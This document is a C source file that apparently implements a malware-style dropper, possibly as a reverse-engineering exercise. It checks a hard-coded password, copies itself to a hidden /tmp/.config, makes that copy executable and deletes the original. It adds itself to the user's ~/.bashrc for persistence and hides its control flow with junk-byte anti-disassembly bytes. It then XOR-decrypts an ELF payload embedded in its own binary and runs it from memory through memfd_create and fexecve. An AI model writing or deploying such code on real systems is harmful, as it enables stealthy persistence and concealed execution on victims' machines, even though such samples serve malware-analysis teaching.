#include <stdlib.h>
#include <stdio.h>
#include <string.h>

#include <sys/types.h>
#include <unistd.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <pwd.h>
#include <sys/syscall.h>
#include <inttypes.h>

// Named .config as if it's an important system file
#define INSTALL_PATH "/tmp/.config"

// Command line password 'abcz'
void func10(int argc, char *argv[])
{
	if (argc == 2)
	{
		if (strlen(argv[1]) == 4)
		{
			if (argv[1][1] == 'b' && argv[1][0] == 'a' && argv[1][2] == 'c' && argv[1][3] == 'z')
			{
				puts("±1	##ok");
				return;
			}
		}
	}

	exit(0);
}

// Chmod a file for execution
int func13()
{
	char mode[] = "0111";
	char buf[100] = INSTALL_PATH;
	int i = strtol(mode, 0, 8);
	if (chmod(buf, i) < 0)
	{
		// Error
		return 1;
	}

	return 0;
}

// Installer
int func11(char *argv[])
{
	// Check if command processor exists
	if (!system(NULL))
	{
		exit(0);
	}

	char buffer[50];	// Possible buffer overflow
	int n = sprintf(buffer, "yes | cp -f %s " INSTALL_PATH " 2>/dev/null", argv[0]);
	system(buffer);

	func13();		// chmod +x

	unlink(argv[0]);	// Delete self

	return n;
}

// Persistence mecanism
int func12()
{
	struct passwd *pwd = getpwuid(getuid());
	char buf[50];

	if (pwd)
	{
		// Possible buffer overflow
		sprintf(buf, "/home/%s/.bashrc", pwd->pw_name);

		FILE *pFile = fopen(buf, "a");

		if (pFile == NULL)
			return 2;

		// Bug: The password is not set and will not be passed on execution
		fprintf(pFile, "\n" INSTALL_PATH "\n\n");
		fclose(pFile);

		return 0;
	}

	return 1;
}

uint32_t func16 (uint32_t x, uint32_t n)
{
	return (x << n) | (x >> (32 - n));
}

// Extractor/unpack
void func14(char* argv[], char** envp)
{
	int pid = getpid();

	char path[32];
	sprintf(path, "%s%d%s", "/proc/", pid, "/exe");

	FILE* filedesc = fopen(path, "rb");	// Cannot open with write access

	if (filedesc < 0)
		return;
	else
	{
		if (fseek(filedesc, 0, SEEK_END) == -1)
			return;
		else
		{
			int memfd = syscall(SYS_memfd_create, "sneakyboi", 0);
			if (memfd < 0)
				return;
			else
			{
				// a7 4e 9c 39 73 e7 ce 9c 39 72 e4 c8 91 23 46 8c 18 30 60 c1 83 06 0c 19 33 67 ce 9d 3a 74 e9 d3
				unsigned int key = 0x391833a7;
				int filesize = ftell(filedesc);

				// Store the payload at this location for execution
				unsigned char* myboi = (unsigned char*)malloc(filesize);

				fseek(filedesc, 0, SEEK_SET);

				if (fread(myboi, filesize, 1, filedesc) != 1)
				{
					return;
				}

				for (int i = filesize - 1; i >= 0; i--)
				{
					myboi[i] ^= key & 0xFF;
					key = func16(key, 1);	// Idea: Rotate by 3 bits because 32 is not a multiple of 3

					if (i < filesize - 4 && myboi[i] == 0x7F && myboi[i + 1] == 'E' && myboi[i + 2] == 'L' && myboi[i + 3] == 'F')
					{
						write(memfd, myboi + i, filesize - i);
						fexecve(memfd, argv, envp);
					}
				}

				free(myboi);
			}
		}
	}

	fclose(filedesc);
}

int main(int argc, char *argv[], char** envp)
{
	func10(argc, argv);

	// Race condition: persistency is configured before the program is installed
	if (!(access(INSTALL_PATH, F_OK) != -1))
		func12();

	// Calling "func11(argv)" as a function pointer
	int (*fun_ptr)(char *argv[]) = &func11;
	(*fun_ptr)(argv);

	// jmp-1, inc eax, dec eax
	asm(".byte 0xEB, 0xFF, 0xC0, 0xFF, 0xC8");

	// jnz+3, followed by 3 null bytes
	asm(".byte 0x75, 0x03, 0x00, 0x00, 0x00");

	func14(argv, envp);
}
